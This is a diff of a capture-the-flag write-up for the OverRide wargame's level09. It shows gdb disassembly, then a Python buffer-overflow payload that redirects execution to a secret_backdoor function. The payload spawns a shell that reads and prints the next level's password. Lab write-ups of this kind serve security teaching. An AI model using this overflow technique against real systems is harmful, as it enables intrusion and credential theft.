@@ -1,3 +1,6 @@
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
+
 level09@OverRide:~$ ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
@@ -8,6 +11,7 @@ level09@OverRide:~$ ./level09
 >: Msg @Unix-Dude
 >>: hello
 >: Msg sent!
+
 level09@OverRide:~$ gdb ./level09
 (gdb) info functions
 All defined functions:
@@ -20,6 +24,7 @@ Non-debugging symbols:
 0x00000000000009cd  set_username
 0x0000000000000aa8  main
 ...
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x0000000000000aa8 <+0>:	push   %rbp
@@ -31,6 +36,7 @@ Dump of assembler code for function main:
    0x0000000000000ac2 <+26>:	pop    %rbp
    0x0000000000000ac3 <+27>:	retq
 End of assembler dump.
+
 (gdb) disas handle_msg
 Dump of assembler code for function handle_msg:
    0x00000000000008c0 <+0>:	push   %rbp
@@ -55,6 +61,7 @@ Dump of assembler code for function handle_msg:
    0x0000000000000930 <+112>:	leaveq
    0x0000000000000931 <+113>:	retq
 End of assembler dump.
+
 (gdb) disas set_username
 Dump of assembler code for function set_username:
    0x00000000000009cd <+0>:	push   %rbp
@@ -106,15 +113,15 @@ Dump of assembler code for function set_username:
    0x0000000000000a9c <+207>:	mov    $0x0,%eax
    0x0000000000000aa1 <+212>:	callq  0x750 <printf@plt>
    0x0000000000000aa6 <+217>:	leaveq
----Type <return> to continue, or q <return> to quit---
    0x0000000000000aa7 <+218>:	retq
 End of assembler dump.
+
 (gdb) disas set_msg
 Dump of assembler code for function set_msg:
    0x0000000000000932 <+0>:	push   %rbp
    0x0000000000000933 <+1>:	mov    %rsp,%rbp
    0x0000000000000936 <+4>:	sub    $0x410,%rsp
-   0x000000000000093d <+11>:	mov    %rdi,-0x408(%rbp)
+   0x000000000000093d <+11>:	mov    %rdi,-0x408(%rbp) //=9b
    0x0000000000000944 <+18>:	lea    -0x400(%rbp),%rax
    0x000000000000094b <+25>:	mov    %rax,%rsi
    0x000000000000094e <+28>:	mov    $0x0,%eax
@@ -146,6 +153,7 @@ Dump of assembler code for function set_msg:
    0x00000000000009cb <+153>:	leaveq
    0x00000000000009cc <+154>:	retq
 End of assembler dump.
+
 (gdb) disas secret_backdoor
 Dump of assembler code for function secret_backdoor:
    0x000000000000088c <+0>:	push   %rbp
@@ -164,3 +172,18 @@ Dump of assembler code for function secret_backdoor:
    0x00000000000008be <+50>:	leaveq
    0x00000000000008bf <+51>:	retq
 End of assembler dump.
+
+level09@OverRide:~$ python -c "print('A' * 40 + '\xd4' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh')" > /tmp/exploit
+
+level09@OverRide:~$ cat /tmp/exploit - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+pwd
+/home/users/level09
+cd ../
+cat end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
